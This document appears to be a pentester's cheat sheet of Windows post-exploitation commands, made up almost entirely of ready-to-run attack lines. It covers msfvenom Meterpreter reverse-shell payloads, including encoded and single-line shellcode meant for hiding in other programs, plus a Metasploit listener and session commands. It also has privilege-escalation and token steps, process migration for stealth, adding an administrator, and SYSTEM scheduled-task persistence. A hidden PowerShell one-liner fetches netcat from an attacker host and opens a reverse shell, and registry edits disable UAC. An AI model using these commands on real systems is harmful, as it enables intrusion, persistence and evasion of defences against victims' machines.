VBA MSF:

    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9988 -f vba-exe
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9988 -f vba-psh

Generate payload:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe

Use listener:

    msfconsole -q -x "set payload windows/meterpreter/reverse_tcp;use exploit/multi/handler;set LHOST 192.168.1.1;set LPORT 4444;set ExitOnSession false;exploit -j;"

Inteactions with sessions:

    session -i 1  (means interact with session 1)
    shell (Launches cmd on victim machine)
    bg (backgrounding current meterpreter session)

PrivEsc Tool:

    run post/multi/recon/local_exploit_suggester
    set SESSIOS 1
    load incognito
    list tokens -u 

Stealthy Operations:

    migrate -N explorer.exe
    run post/windows/manage/migrate

VBA PowerShell Dropper
VBA Powercat

adding user to administrator group:
    
    cmd.exe /k net localgroup administrators user /add

restarting service:
    
    sc stop svcname & sc start svcname

command for compile on kali linux:

    x86_64-w64-mingw32-gcc yourcode.c -shared -o yourdllfile.dll

create scheduled task with cmd
    
    schtasks /create /tn "SecurityStartup" /tr "C:\pathtoprogram.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f

create a meterpreter shellcode for single line good for hide in the another program

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f c | tr -d '\n' | sed 's/ //g'

runas.exe

    net users
    runas /user:usernameofvictim "cmd.exe"
    runas /user:Machinename\usernameofvictim "cmd.exe"

Powershell history file in environment

    cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

drop nc.exe (Netcat) Attacker machine and executes as a background command:

    powershell -Command "$out = Join-Path $env:Temp 'nc.exe'; Invoke-WebRequest -Uri 'http://192.168.1.10/nc.exe' -OutFile $out; Start-Process $out -ArgumentList '192.168.1.65 55522 -e powershell' -WindowStyle Hidden"

disable UAC with PowerShell command 

    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0


DisableUAC.reg

        Windows Registry Editor Version 5.00

        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
        "ConsentPromptBehaviorAdmin"=dword:00000000
